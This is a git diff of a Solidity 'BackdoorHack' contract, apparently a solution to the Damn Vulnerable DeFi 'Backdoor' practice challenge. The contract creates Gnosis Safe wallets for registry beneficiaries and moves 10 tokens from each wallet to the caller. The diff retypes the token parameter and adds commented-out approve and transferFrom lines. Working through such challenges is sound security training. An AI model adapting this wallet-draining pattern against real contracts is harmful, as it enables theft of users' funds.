@@ -111,7 +111,7 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
 }
 
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
-import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "../DamnValuableToken.sol";
 
 contract BackdoorHack {
     // run attack via constructor as initializer
@@ -119,7 +119,7 @@ contract BackdoorHack {
         address _registryAddress,
         address _masterCopyAddress,
         GnosisSafeProxyFactory _walletFactory,
-        IERC20 _token,
+        DamnValuableToken _token,
         address[] memory _beneficiaries
     ) {
         // create wallet for each beneficiary here(for loop each wallet)
@@ -148,8 +148,10 @@ contract BackdoorHack {
                 i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                 IProxyCreationCallback(_registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
             );
-
-            // wallet will receieve DVT via callback then transfer to msg.sender
+            // approve token transfer
+            // _token.approve(address(wallet), 40 ether);
+            // // wallet will receieve DVT via callback then transfer to msg.sender
+            // _token.transferFrom(address(wallet), msg.sender, 10 ether);
             IERC20(address(wallet)).transfer(msg.sender, 10 ether);
         }
     }
